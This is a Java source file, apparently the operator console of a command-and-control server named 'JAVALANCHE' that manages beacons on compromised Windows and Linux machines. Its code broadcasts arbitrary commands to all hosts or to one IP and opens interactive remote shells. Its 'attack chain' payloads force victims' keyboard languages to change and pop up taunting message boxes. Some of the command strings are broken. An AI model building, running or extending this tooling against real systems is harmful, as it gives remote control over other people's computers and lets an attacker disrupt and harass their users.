package Servers.C2;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.Scanner;
import java.util.Queue;
import java.util.HashSet;
import java.util.ArrayList;
import java.util.Arrays;

public class C2ServerUserHandler implements Runnable{
    private String RED = "\u001B[31m";
    private String BLUE = "\u001B[34m";
    private String RESET = "\u001B[37m";

    // Pointer back to the C2 Server
    private C2Server C2server;

    // Scanner for the user to enter input
    private Scanner userInputScanner;

    // Hashed Password for authentication betwen the Server and the Beacon
    private String passwordDigest;

    // This is a Hash Map of Long Range Beacons that are waiting for MFA.
    // The Key is the IP Address of the Beacon, and the Value is it's status,
    // "Waiting", "Approved", or "Denied"
    private HashMap<String,String> beaconsWaitingForMFA;

    // The User's current Path in the CLI
    private String currentUserPath;

    // Queue of messages to be printed to the CLI
    private Queue<String> messageQueue;

    /**
     * Class to handle input from the user controlling the C2
     * and send it back to the C2 Server.
     * 
     * @param server Pointer to the C2 Server
     */
    protected C2ServerUserHandler(C2Server server){
        this.C2server = server;
        this.userInputScanner = new Scanner(System.in);
        this.passwordDigest = null;
        this.beaconsWaitingForMFA = new HashMap<>();
        this.currentUserPath = "";
        this.messageQueue = new LinkedList<String>();
    }

    /**
     * This function authenticates new beacons. First, the Password Hash from the Beacon
     * is compared to the password hash stored. If they match, then the user is prompted
     * through the CLI to confirm the authentication.
     * 
     * @param enteredPasswordHash the hashed password from the Beacon Server
     * @param IPAddress The IP Address of the Beacon attempting to connect
     * @return Either 'Authentication Successful', 'Authentication Failed: Incorrect Password', 'Authentication 
     * Failed: User Denied MFA Prompt', or 'Authentication Failed: Authentication Process could not be completed'
     */
    protected String authenticateToC2(String enteredPasswordHash, String IPAddress){
        if(enteredPasswordHash.equals(passwordDigest)){
            beaconsWaitingForMFA.put(IPAddress, "Waiting");
        } else{
            return "Authentication Failed: Incorrect Password";
        }

        try{
            synchronized(beaconsWaitingForMFA){
                beaconsWaitingForMFA.wait();
                if(beaconsWaitingForMFA.get(IPAddress).equals("Approved")){
                    beaconsWaitingForMFA.remove(IPAddress);
                    return "Authentication Successful";
                }else{
                    beaconsWaitingForMFA.remove(IPAddress);
                    return "Authentication Failed: User Denied MFA Prompt";
                }
            }
            
        }catch(InterruptedException e){
            e.printStackTrace();
        }
        return "Authentication Failed: Authentication Process could not be completed";
        
    }

    /**
     * Used by the C2 Server to output a message to the CLI for the Threat Actor to View
     * 
     * @param message Message to be displayed
     */
    protected void outputToCLI(String message){
        messageQueue.add(message);
    }

    private void printJAVALANCHE(){
        System.out.println(RESET);
        System.out.println("*          *             *        *    *       *        * /\\   *      *     *      *      *     *            *             *        *");
        System.out.println("      *        *         *      *  /\\     *       *      //\\\\*      * *      *    *  /\\           *     *             *           *");
        System.out.println("     *                        /\\  //\\\\      *       *   ///\\\\\\   *        *     /\\  //\\\\   *         *         *         * *        *");
        System.out.println("          *        *   /\\ *  //\\\\///\\\\\\   *    /\\      ////\\\\\\\\   *   *  /\\    //\\\\///\\\\\\ *   *  /\\  *  *   *     */\\      *    *");
        System.out.println("  *    *     *   *    //\\\\  ///\\////\\\\\\\\  /\\  //\\\\    /  ^ ^^  \\     *  //\\\\  ///\\////\\\\\\\\  /\\  //\\\\  *     *    *//\\\\  *    *   *");
        System.out.println(" *       /\\  *    *  /  ^ \\/^ ^/^  ^  ^ \\/^ \\/  ^ \\  /  ^  /\\  ^\\   *  /  ^\\ /^ ^/^  ^  ^ \\/^ \\/  ^ \\  /\\        ///\\\\\\    /\\        * ");
        System.out.println("     *  / ^\\    /\\  / ^   /  ^/ ^ ^ ^   ^\\ ^/  ^^  \\/  ^^ / ^\\^  \\/\\  / ^   /  ^/ ^ ^ ^   ^\\ ^/  ^^  \\/^ \\  /\\  /^  ^^ \\  //\\\\ *       ");
        System.out.println(" *     /^   \\* / ^\\/ ^ ^   ^ / ^  ^    ^  \\/ ^   ^  \\ ^  /^   \\  / ^\\/ ^ ^   ^ / ^  ^    ^  \\/ ^   ^  \\  ^\\/ ^\\/  ^^  ^ \\///\\\\\\     *      ");
        System.out.println("     */  ^ ^ \\/^  ^\\ ^ ^ ^   ^  ^   ^         ^   ^  \\  /  ^ ^ \\/^  ^\\ ^ ^ ^   ^  ^   ^    ^    ^   ^  \\   \\  /    ^ ^  /  ^  ^\\ *        ");
        System.out.println("   * / ^ ^  ^ \\ ^  "+RED+ "_"+RESET+"^ ^ ^  "+RED+"___"+RESET+" ^ "+RED+"__"+RESET+" ^  ^   "+RED+"__"+RESET+" ^ "+RED+"___"+RESET+"  ^^   "+RED+"_"+RESET+"^ ^ ^ ^   ^ "+RED+"___"+RESET+"  ^^ ^ "+RED+"___"+RESET+" ^  ^"+RED+"_"+RESET+" ^ "+RED+"_______"+RESET+" ^ "+RED+"_"+RESET+" ^^ "+RED+"_"+RESET+" ^ "+RED+"_______"+RESET+"   ^  ^  \\ *  *");
        System.out.println("    / ^^  ^ ^ ^\\  "+RED+"| |     / _ \\  \\ \\      / /  / _ \\     | |          / _ \\     |   \\   | | |  _____| | |  | | |  _____|"+RESET+"    ^^   \\    ");
        System.out.println(" * /  ^  ^^ ^ ^ \\ "+RED+"| |    / /_\\ \\  \\ \\    / /  / /_\\ \\    | |         / /_\\ \\    | |\\ \\  | | | |       | |__| | | |___"+RESET+"   ^    ^    \\ *");
        System.out.println( "  /^ ^  ^  ^^ "+RED+"_   | |   / _____ \\  \\ \\  / /  / _____ \\   | |        / _____ \\   | | \\ \\ | | | |       |  __  | |  ___|"+RESET+"      ^   ^  \\     ");
        System.out.println(" / ^   ^   ^ "+RED+"| |__| |  / /     \\ \\  \\ \\/ /  / /     \\ \\  | |____   / /     \\ \\  | |  \\ \\| | | |_____  | |  | | | |_____"+RESET+"   ^    ^    \\");
        System.out.println("/ ^ ^ ^  ^  ^"+RED+"|______| /_/       \\_\\  \\__/  /_/       \\_\\ |______| /_/       \\_\\ |_|   \\___| |_______| |_|  |_| |_______|"+RESET+"    ^      ^ \\");
        System.out.println("oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo");
        System.out.println();
    }

    // private void printHome(){
    //     System.out.println(RESET);
    //     System.out.println("      _..---^---.._         __    __                                                      ");
    //     System.out.println("     /  /  /   \\ \\ \\       |  |  |  |                                   ");
    //     System.out.println("    /__/__/_____\\_\\_\\      |  |  |  |   ______    _________    _______                       ");
    //     System.out.println("   |   _ _           |     |  |__|  |  |  __  |  |  _   _  |  |  _____|              ");
    //     System.out.println("   |  |_|_|    __    |     |   __   |  | |  | |  | | | | | |  | |____                         ");
    //     System.out.println("   |  |_|_|   | .|   |     |  |  |  |  | |__| |  | | | | | |  | |_____                       ");
    //     System.out.println("   |__________|__|___|     |__|  |__|  |______|  |_| |_| |_|  |_______|                                                      ");
    //     System.out.println();
    // }

    private void printCommand(){
        System.out.println(RESET);
        System.out.println("       ____                          _________                         __           ");
        System.out.println("       \\   \\                        |   ______|                       |  |             ");
        System.out.println("        \\   \\                       |  |           _________     _____|  |             ");
        System.out.println("         \\   \\                      |  |          |  _   _  |   |   __   |                ");
        System.out.println("         /   /                      |  |          | | | | | |   |  |  |  |                 ");
        System.out.println("        /   /      __________       |  |______    | | | | | |   |  |__|  |                 ");
        System.out.println("       /___/      |__________|      |_________|   |_| |_| |_|   |________|            ");
        System.out.println();
    }

    private void printAttackChain(){
        System.out.println(RESET);
        System.out.println("       ____                          _________                         __           ");
        System.out.println("       \\   \\                        |   ______|                       |  |             ");
        System.out.println("        \\   \\                       |  |           _________     _____|  |             ");
        System.out.println("         \\   \\                      |  |          |  _   _  |   |   __   |                ");
        System.out.println("         /   /                      |  |          | | | | | |   |  |  |  |                 ");
        System.out.println("        /   /      __________       |  |______    | | | | | |   |  |__|  |                 ");
        System.out.println("       /___/      |__________|      |_________|   |_| |_| |_|   |________|            ");
        System.out.println();
    }

    private void printRequest(){
        System.out.println(RESET);
        System.out.println("              _.-/`)        _________                                                                           __    ");
        System.out.println("             // / / )      |   ___   \\                                                                         |  |");
        System.out.println("          .=// / / / )     |  |___)   |    ________     _________    __     __     ________     ________    ___|  |___  ");
        System.out.println("         //`/ / / / /      |   ___   /    |  ______|   |   ___   |  |  |   |  |   |  ______|   | _______|  |___    ___|");
        System.out.println("        // /     ` /       |  |  \\  \\     | |______    |  |   |  |  |  |   |  |   | |______    |______  |      |  |    ");
        System.out.println("       ||         /        |  |   \\  \\    | |______    |  |___| _|  |  |___|  |   | |______     ______| |      |  |           ");
        System.out.println("        \\\\_______/         |__|    \\__\\   |________|   |_______\\_\\  |_________|   |________|   |________|      |__|          ");
        System.out.println();
    }

    /**
     * This Function is used by the CLI for the user to send commands to clients
     * 
     * @param OS the Operating System 'Windows' or 'Linux'
     */
    private void sendCommand(String OS){
        String color = "";
        // Send Command to Client Menu
        if(OS == "Windows"){
            color = BLUE;
            System.out.println(color);
            System.out.println("      _______ _______     __    __    __    __                         ___           ");
            System.out.println("     /      //      /    |  |  |  |  |  |  |__|   __                  |   |   _________    __          __   _________");
            System.out.println("    /      //      /     |  |  |  |  |  |   __   |  |______    _______|   |  |   ___   |  |  |   __   |  | |  _______|");
            System.out.println("   /_____ //______/      |  |  |  |  |  |  |  |  |   ___   |  |    ___    |  |  |   |  |  |  |  |  |  |  | | |_______  "); 
            System.out.println("  /      //      /       |  |  |  |  |  |  |  |  |  |   |  |  |   |   |   |  |  |   |  |  |  |  |  |  |  | |______   |        ");
            System.out.println(" /      //      /        |  |__|  |__|  |  |  |  |  |   |  |  |   |___|   |  |  |___|  |  |  |__|  |__|  |  ______|  | ");
            System.out.println("/_____ //______/         |______________|  |__|  |__|   |__|  |___________|  |_________|  |______________| |_________|          ");
            System.out.println();
        }
        if(OS == "Linux"){
            color = RED;
            System.out.flush();
            System.out.println(color);
            System.out.println("     .-------.           ___           __                            ");
            System.out.println("    /  o_o   |          |   |         |__|   __                            ");
            System.out.println("    |  :_/   |          |   |          __   |  |______    __    __   __    __ ");
            System.out.println("   //        \\\\         |   |         |  |  |   ___   |  |  |  |  |  \\ \\  / /            "); 
            System.out.println("   (|        | )        |   |         |  |  |  |   |  |  |  |  |  |   \\ \\/ /                   ");
            System.out.println("  /'\\_     _/`\\         |   |______   |  |  |  |   |  |  |  |__|  |   / /\\ \\                   ");
            System.out.println("  \\____)=(_____/        |__________|  |__|  |__|   |__|  |________|  /_/  \\_\\             ");
            System.out.println();
        }
        System.out.println("1. Send a command to ALL " + OS + " Computers");
        System.out.println("2. Send a command to A SPECIFIC " + OS + " Computer");
        System.out.println("3. Back");
        System.out.println(RESET);
        System.out.print(currentUserPath + " >> ");
        String userInput = userInputScanner.nextLine();

        String scope = "";

        // Send commands to all Windows or Linux machines
        if(userInput.equals("1")){
            scope = OS;

        // Send commands to single IP
        } else if(userInput.equals("2")){
            System.out.print("Enter IP Address of desired target >> ");
            String IPAddress = userInputScanner.nextLine();
            scope = IPAddress;
        
        // Send user back to Command Menu
        } else if(userInput.equals("3")){
            currentUserPath = "Command";
        } else {
            System.out.println("Invalid Input");
        }

        // Take commands from user
        if(userInput.equals("1") || userInput.equals("2")){
            System.out.print("Enter Command to be run >> ");
            String finalCommand = "Command " + scope + "_" + userInputScanner.nextLine();
            C2server.broadcastToBeacons(finalCommand);
            currentUserPath = "Command " + OS;
        }
        System.out.println(RESET);
    }

    /**
     * This function is used to enter a shell of one individual client
     */
    private void enterClientShell(){
        System.out.println("Enter 'q' at any time to exit the shell and return to the main menu\n");
        System.out.print("Enter IP address of Client >> ");
        String clientIP = userInputScanner.nextLine().toLowerCase();
        if(clientIP.equals("q")){
            currentUserPath = "";
        } else {
            System.out.println("Setting up Shell ... ");

            // Empty the Message Queue
            synchronized(messageQueue){
                while(!(messageQueue.isEmpty())){
                    System.out.println(messageQueue.remove());
                }
            }

            C2server.broadcastToBeacons("Command " + clientIP + "_pwd");
            try{
                Thread.sleep(2000);
            } catch(InterruptedException e){
                e.printStackTrace();
            }

            C2server.broadcastToBeacons("Request " + clientIP + "_ ");

            try{
                Thread.sleep(2000);
            } catch(InterruptedException e){
                e.printStackTrace();
            }

            String currentDirectory = "C:\\";
            
            // readMessages variable is used to ensure that only the results of the command run are output to the user
            ArrayList<String> readMessages;

            ArrayList<String> tempReadMessagesList;

            // messages is used to store all client responses
            Object messages[];
    
            // Iterate through each message returned from the client, starting at the end, to find the current directory
            synchronized(messageQueue){
                messages = messageQueue.toArray();

                // Initialize the readMessages ArrayList with all of the messages already in the client responses
                readMessages = new ArrayList<>();
                for(Object message : messages){
                    readMessages.add(message.toString());
                }

                for(int i = messages.length - 1; i > 0; i--){
                    if(messages[i].toString().contains("C:\\")){
                        currentDirectory = messages[i].toString().trim().split(" ")[1];
                        break;
                    }
                    else if(messages[i].toString().contains("/")){
                        currentDirectory = messages[i].toString().trim().split(" ")[1];
                        break;
                    }
                }
            }

            String command;
            while(true){
                if(currentDirectory.contains("C:")){
                    System.out.print("PS " + currentDirectory + "> ");
                } else {
                    System.out.print("root@" + clientIP + ":" + currentDirectory + "# ");
                }

                command = userInputScanner.nextLine();
                if (!(command.isEmpty())){
                    if(command.equals("q")){
                        currentUserPath = "";
                        break;
                    } else {
                        // Send the Command
                        C2server.broadcastToBeacons("Command " + clientIP + "_" + command);

                        // Give the client a moment to run the command and return tne responses
                        try{
                            Thread.sleep(2000);
                        } catch(InterruptedException e){
                            e.printStackTrace();
                        }

                        C2server.broadcastToBeacons("Request " + clientIP + "_ ");
                        
                        try{
                            Thread.sleep(2000);
                        } catch(InterruptedException e){
                            e.printStackTrace();
                        }

                        // Get all messages
                        messages = messageQueue.toArray();

                        // Store all of the messages just received in a new temp list
                        tempReadMessagesList = new ArrayList<>();
                        for(Object message : messages){
                            tempReadMessagesList.add(message.toString());
                        }

                        // Iterate through responses and print only ones that are new
                        for(Object message : messages){
                            if(readMessages.contains(message.toString())){
                                System.out.println("Removing Object");
                                readMessages.remove(message.toString());
                            } else {
                                System.out.println("Correct Print:");
                                System.out.println(message.toString());
                            }
                        }

                        // Replace the old already read messages list with the new one saved from earlier
                        System.out.println("Before: " + readMessages);
                        readMessages = tempReadMessagesList;
                        System.out.println("After: " + readMessages);

                    }
                }
            }
        }
    }

    private void waitForResponse() throws InterruptedException{
        // Waiting for traffic
        System.out.println();
        System.out.println("Waiting for response...");
        Thread.sleep(7000);
        System.out.println();
    }

    @Override
    public void run() {
        // User enters password that will be used for authentication
        String password1 = "";
        String password2 = "a";
        while(!(password1.equals(password2))){
            System.out.print("Enter Password for authentication: ");
            password1 = userInputScanner.nextLine();
            System.out.print("Re-enter Password: ");
            password2 = userInputScanner.nextLine();
            if(!(password1.equals(password2))){
                System.out.println("Passwords do not match");
            }
        }

        // This password is then hashed and stored
        try{
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] encodedhash = digest.digest(password1.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder(2 * encodedhash.length);
            for (int i = 0; i < encodedhash.length; i++) {
                String hex = Integer.toHexString(0xff & encodedhash[i]);
                if(hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            passwordDigest = hexString.toString();
        } catch(Exception e){}
        
        // Loop for the User to use the CLI
        String userInput = "";
        while(true){
            // If there are any beacons waiting for MFA, prompt user if they should be allowed to connect.
            synchronized(beaconsWaitingForMFA){
                if(beaconsWaitingForMFA.size() > 0){
                    for(String IPAddress : beaconsWaitingForMFA.keySet()){
                        System.out.print("New Beacon Entered Password Correctly from " + IPAddress + ". Allow connection to C2 Server? (y/n) ");
                        if(userInputScanner.nextLine().toLowerCase().equals("y")){
                            beaconsWaitingForMFA.replace(IPAddress, "Waiting", "Approved");
                        }else{
                            beaconsWaitingForMFA.replace(IPAddress, "Waiting", "Denied");
                        }
                    }
                    beaconsWaitingForMFA.notifyAll();
                }
            }

            // Print all messages waiting in the queue.
            synchronized(messageQueue){
                while(!(messageQueue.isEmpty())){
                    System.out.println(messageQueue.remove());
                }
            }
            
            if(currentUserPath.equals("")){
                printJAVALANCHE();
                System.out.println("1. Send a command to all Clients");
                System.out.println("2. Enter a Shell");
                System.out.println("3. Launch an Attack Chain");
                System.out.println("4. Request Data from Clients");
                System.out.println("5. Get Status from Clients");
                System.out.println("6. Exit CLI / Close Servers");
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();
                if(userInput.equals("1")){
                    currentUserPath = "Command";
                } else if(userInput.equals("2")){
                    currentUserPath = "Shell";
                } else if(userInput.equals("3")){
                    currentUserPath = "AttackChain";
                } else if(userInput.equals("4")){
                    currentUserPath = "Request";
                } else if(userInput.equals("5")){
                    currentUserPath = "Status";
                } else if(userInput.equals("6")){
                    System.out.println(RED + "Closing Server..."+ RESET);
                    System.out.println();
                    C2server.stopServer();
                    C2server.broadcastToBeacons("quit");
                    break;
                } else {
                    System.out.println("Invalid Input");
                }
            } else if(currentUserPath.equals("Command")){
                printCommand();
                System.out.println("1. Send a command to " + BLUE + "Windows" + RESET + " Computers");
                System.out.println("2. Send a command to " + RED + "Linux" + RESET + " Computers");
                System.out.println("3. Back");
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();
                if(userInput.equals("1")){
                    currentUserPath += " Windows";
                    sendCommand("Windows");
                } else if(userInput.equals("2")){
                    currentUserPath += " Linux";
                    sendCommand("Linux");
                } else if(userInput.equals("3")){
                    currentUserPath = "";
                } else {
                    System.out.println("Invalid Input");
                }
            } else if(currentUserPath.equals("Shell")){
                enterClientShell();
            } else if(currentUserPath.equals("Command Windows")){
                sendCommand("Windows");
            } else if(currentUserPath.equals("Command Linux")){
                sendCommand("Linux");
            } else if(currentUserPath.equals("AttackChain")){
                // Menu
                printAttackChain();
                System.out.println("1. THE GOOSE");
                System.out.println("2. Change Keyboard Language [EASY]");
                System.out.println("3. Change Keybaord Layout [HARD]");
                System.out.println("4. Change Keybaord Layout to English");
                System.out.println("5. Send Message Box");
                System.out.println("6. Back");
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                String userAttackChainChoice = "";
                userAttackChainChoice = userInputScanner.nextLine();

                // Validate Selection and choose scope of attack
                String os = "";
                String target = "";
                HashSet<String> validInputs = new HashSet<>(Arrays.asList("1","2","3","4","5"));
                if(validInputs.contains(userAttackChainChoice)){
                    System.out.println("Enter 'Windows','Linux', or 'All");
                    System.out.print(" >> ");
                    os = userInputScanner.nextLine();
                    os = os.toLowerCase().strip();
                    if(os.equals("windows") || os.equals("linux")){
                        System.out.println("All " + os + " or a specific IP (Enter 'All'/'x.x.x.x')");
                        System.out.print(" >> ");
                        target = userInputScanner.nextLine();
                        target = target.toLowerCase().strip();
                    } else {
                        target = "all";
                    }
                }

                String windowsCommands = "";
                String linuxCommands = "";

                // Attach Chain implementations
                if(userAttackChainChoice.equals("1")){
                    // TODO: Figure out how to launch the goose.
                } else if (userAttackChainChoice.equals("2")){
                    // Set their Keybaord language to French for 60 seconds, then change it back to English

                    // Windows
                    windowsCommands = "";
                    windowsCommands += "Set-WinUserLanguageList fr-FR -force;";
                    windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                    windowsCommands += "[System.Windows.MessageBox]::Show('Have Fun Learning French MF');";
                    windowsCommands += "Start-Sleep -Seconds 60;";
                    windowsCommands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
                    windowsCommands += "Set-WinUserLanguageList en-US -force";

                    // Linux
                    linuxCommands = "";
                    linuxCommands += "setxkbmap fr;";
                    linuxCommands += "notify-send 'Have Fun Learning French MF'";
                    linuxCommands += "sleep 60;";
                    linuxCommands += "notify-send 'Ok you can have English Again'";
                    linuxCommands += "setxkbmap us;";
                    
                } else if (userAttackChainChoice.equals("3")){
                    // Change their Keybaord language every 30 seconds

                    // Windows
                    HashMap<String, String> languages = new HashMap<>();
                    windowsCommands = "";
                    languages.put("French", "fr-FR");
                    languages.put("German", "de-DE");
                    languages.put("Arabic", "ar-SA");
                    languages.put("Cantonese", "zh-HK");
                    languages.put("Italian","it-IT");
                    for(String language : languages.keySet()){
                        windowsCommands += "Set-WinUserLanguageList " + languages.get(language) + " -force;";
                        windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                        windowsCommands += "[System.Windows.MessageBox]::Show('Have Fun Learning " + language + " MF');";
                        windowsCommands += "Start-Sleep -Seconds 30;";
                    }
                    windowsCommands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
                    windowsCommands += "Set-WinUserLanguageList en-US -force;";

                    // Linux
                    HashMap<String, String> languagesLin = new HashMap<>();
                    linuxCommands = "";
                    languagesLin.put("French", "fr");
                    languagesLin.put("German", "de");
                    languagesLin.put("Arabic", "sy");
                    languagesLin.put("Chinese", "cn");
                    languagesLin.put("Italian","it");
                    for(String language : languages.keySet()){
                        linuxCommands += "setxkbmap " + language + ";";
                        linuxCommands += "notify-send 'Have Fun Learning " + languagesLin.get(language) + " MF'";
                        linuxCommands += "sleep 60;";
                    }
                    linuxCommands += "notify-send 'Ok you can have English Again'";
                    linuxCommands += "setxkbmap en;";
                    // TODO Figure out how to mess with Linux Keyboard
                } else if (userAttackChainChoice.equals("4")){
                    // Change it back to english in case we mess up

                    // Windows
                    windowsCommands = "";
                    windowsCommands += "Set-WinUserLanguageList en-US -force;";
                    windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                    windowsCommands += "[System.Windows.MessageBox]::Show('Sorry about that heres english')";

                    // Linux
                    linuxCommands = "";
                    linuxCommands += "notify-send 'Sorry about that heres english'";
                    linuxCommands += "setxkbmap en;";
                    // TODO Figure out how to mess with Linux Keyboard
                } else if (userAttackChainChoice.equals("5")){
                    // Send a message box
                    System.out.println("Enter A Message to Display: ");
                    System.out.print(" >> ");
                    String message = userInputScanner.nextLine();
                    
                    // Windows
                    windowsCommands = "";
                    windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                    windowsCommands += "[System.Windows.MessageBox]::Show('"+ message+ "');";

                    // Linux
                    linuxCommands = "";
                    linuxCommands += "notify-send " + message;
                }else if (userAttackChainChoice.equals("6")){
                    currentUserPath = "";
                } else {
                    System.out.println("Invalid Input");
                }

                // Send the commands
                HashSet<String> inputsToSendCommandsFor = new HashSet<>(Arrays.asList("2","3","4","5"));
                if(inputsToSendCommandsFor.contains(userAttackChainChoice)){
                    // Send commands based on os/scope
                    if(target.equals("all")){
                        if(os.equals("windows") || os.equals("all")){
                            C2server.broadcastToBeacons("Command Windows_" + windowsCommands);
                        }
                        if(os.equals("linux") || os.equals("all")){
                            C2server.broadcastToBeacons("Command Linux_" + linuxCommands);
                        }
                    } else {
                        if(os.equals("windows")){
                            C2server.broadcastToBeacons("Command " + target + "_" + windowsCommands);
                        } else {
                            C2server.broadcastToBeacons("Command " + target + "_" + linuxCommands);
                        }
                    }
                }
                
            // Request Menu Data from Clients
            } else if(currentUserPath.equals("Request")){
                printRequest();
                System.out.println("1. Request from ALL " + BLUE + "Windows" + RESET + " Clients");
                System.out.println("2. Request from ALL " + RED + "Linux" + RESET + " Clients");
                System.out.println("3. Request from single IP Address");
                System.out.println("4. Back");
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();

                // Request from all Windows Boxes
                if(userInput.equals("1")){
                    String OS = "Windows";
                    C2server.broadcastToBeacons("Request " + OS + "_ ");
                    try {
                        waitForResponse();
                    } catch (InterruptedException e) {e.printStackTrace();}

                // Request from all Linux Boxes
                } else if (userInput.equals("2")){
                    String OS = "Linux";
                    C2server.broadcastToBeacons("Request " + OS + "_ ");
                    try {
                        waitForResponse();
                    } catch (InterruptedException e) {e.printStackTrace();}

                // Request from single IP
                } else if (userInput.equals("3")){
                    // Ask user for IP
                    System.out.print("Enter IP Address for desired request >> ");
                    String IPAddress = userInputScanner.nextLine();
                    C2server.broadcastToBeacons("Request " + IPAddress + "_ ");
                    try {
                        waitForResponse();
                    } catch (InterruptedException e) {e.printStackTrace();}
                
                // Return to home menu
                } else if (userInput.equals("4")){
                        currentUserPath = "";
                } else {
                    System.out.println("Invalid Input");
                }

            // Get Client Status Data
            } else if(currentUserPath.equals("Status")){
                C2server.broadcastToBeacons("Status All_ ");
                try {
                    waitForResponse();
                } catch (InterruptedException e) {e.printStackTrace();}
                currentUserPath = "";
            }
        }
    }
    public static void main(String[] args) throws IOException {
        C2Server server = new C2Server();
        C2ServerUserHandler CLI = new C2ServerUserHandler(server);
        CLI.printJAVALANCHE();
    }
}

